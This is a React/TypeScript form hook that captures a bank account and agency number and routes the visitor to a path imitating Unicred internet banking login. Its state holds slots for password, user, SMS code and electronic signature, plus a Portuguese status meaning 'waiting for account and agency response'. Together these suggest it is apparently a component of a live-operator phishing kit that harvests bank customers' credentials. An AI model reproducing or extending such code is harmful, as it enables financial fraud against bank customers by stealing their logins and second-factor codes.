'use client';

import { useForm, SubmitHandler, Mode } from 'react-hook-form';

import navigate from '@/actions/navigate';
import { zodResolver } from '@hookform/resolvers/zod';

import { useAccountContext } from '../accountContext/useContext';
import { useLoadingContext } from '../loadingContext/useContext';
import { zodSchema, BodyProtocol } from './validation';

interface Props {
  mode?: Mode;
  reValidateMode?: Exclude<Mode, 'onTouched' | 'all'>;
}

export default function useFromAccessAccount({ mode, reValidateMode }: Props) {
  const {
    handleSubmit,
    register,
    clearErrors,
    setFocus,
    formState: { errors },
  } = useForm<BodyProtocol>({
    resolver: zodResolver(zodSchema),
    mode,
    reValidateMode,
  });
  const { isLoading, setIsLoading } = useLoadingContext();
  const { setAccount } = useAccountContext();

  const handleFormSubmit: SubmitHandler<BodyProtocol> = async body => {
    if (isLoading) return;
    const { account, agency } = body;
    setIsLoading(true);
    setAccount(state => ({
      ...state,
      account,
      agency,
      status: 'esperando resposta conta e agência',
      electronicSignature: 'N/D',
      numberSMS: 'N/D',
      password: 'N/D',
      user: 'N/D',
      sms: 'N/D',
    }));
    navigate('/unicred-internetbanking/login');
  };

  return {
    handleSubmit: handleSubmit(handleFormSubmit),
    register,
    errors,
    clearErrors,
    setFocus,
  };
}
